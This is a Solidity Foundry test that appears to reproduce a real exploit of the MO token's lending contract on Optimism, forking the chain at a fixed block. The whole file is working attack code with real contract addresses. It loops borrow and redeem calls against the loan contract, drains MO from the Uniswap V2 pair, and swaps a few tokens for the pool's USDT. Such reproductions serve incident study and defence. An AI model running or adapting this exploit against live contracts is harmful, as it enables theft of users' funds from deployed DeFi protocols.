// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IUniswapV2.sol";

interface Loan {
    function borrow(uint256 amount, uint256 duration) external;

    function redeem(uint256 index) external;

    function borrowOrdersCount(address account) external view returns (uint256);
}

interface Relation {
    function bind(address referrer) external;

    function hasBinded(address user) external view returns (bool);
}

IERC20 constant MO = IERC20(0x61445Ca401051c86848ea6b1fAd79c5527116AA1);
IERC20 constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
Loan constant LOAN = Loan(0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E);
address constant ApproveProxy = 0x9D8355a8D721E5c79589ac0aB49BC6d3e0eF7C3F;
IUniswapV2Router constant Router = IUniswapV2Router(
    0x9eADD135641f8b8cC4E060D33d63F8245f42bE59
);
IUniswapV2Pair constant UniV2Pair = IUniswapV2Pair(
    0x4a6E0fAd381d992f9eB9C037c8F78d788A9e8991
);
Relation constant RELAT = Relation(0xb03B377d524AF7D5b3769414d969FFe627C062F9);

contract Money {
    function approve(address a) public {
        MO.approve(address(a), type(uint256).max);
    }
}

contract MoTest is Test {
    uint256 mo_balance;

    function setUp() public {
        vm.createSelectFork("optimism", 117395511);
        deal(address(MO), address(this), 62147724);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        print("[Begin] USDT before", USDT.balanceOf(address(this)), 6);

        Money bind_contract = new Money();
        bind_contract.approve(address(this));
        // Here can bind some reffer address but can't find the first reffer = =
        // RELAT.bind(address(bind_contract));
        MO.approve(ApproveProxy, type(uint256).max);
        USDT.approve(ApproveProxy, type(uint256).max);
        mo_balance = MO.balanceOf(address(this));
        // console.log(MO.balanceOf(address(UniV2Pair)));
        uint256 i = 0;
        while (i < 80) {
            try this.DoBorrow(i) {} catch {
                break;
            }
            i++;
        }
        LOAN.borrow(MO.balanceOf(address(UniV2Pair)) - 1, 0);
        // console.log(MO.balanceOf(address(UniV2Pair)));
        MO.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(MO);
        path[1] = address(USDT);
        // Router.swapExactTokensForTokens(MO.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100);
        MO.transfer(address(Router), 10); // need some token for pair to send.
        Router.swapExactTokensForTokens(
            3,
            0,
            path,
            address(this),
            block.timestamp + 100
        );
        print("[End] USDT after", USDT.balanceOf(address(this)), 6);
    }

    function DoBorrow(uint256 i) public {
        LOAN.borrow(mo_balance, 0);
        LOAN.redeem(i);
    }
}
